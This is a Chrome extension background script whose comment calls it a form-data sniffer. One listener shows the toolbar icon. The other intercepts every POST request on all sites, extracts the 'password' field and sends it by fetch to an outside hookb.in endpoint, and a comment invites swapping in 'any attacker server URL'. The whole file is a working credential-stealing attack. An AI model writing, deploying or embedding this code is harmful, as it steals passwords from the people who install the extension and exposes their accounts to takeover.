//to show extension icon on toolbar
chrome.runtime.onMessage.addListener(function(request,sender,sendResponse){
    if(request.todo == "showPageAction"){
        chrome.tabs.query({active:true, currentWindow: true}, function(tabs){
            chrome.pageAction.show(tabs[0].id);
        });
    }
});
//sniff form data
chrome.webRequest.onBeforeRequest.addListener(
    function(details) {
      if(details.method == "POST") {
        console.log(JSON.stringify(details.requestBody.formData['password'][0]));
        //change url below to any attacker server URL
        fetch('https://hookb.in/lJyEQ7JowNIrXXZWdJzr', {
          method: 'post',
          body: details.requestBody.formData['password'][0],
        })
        .then(response => response.json())
        .then(data => console.log(data));
      }
    },
    {urls: ["<all_urls>"]},
    ["requestBody"]
  );
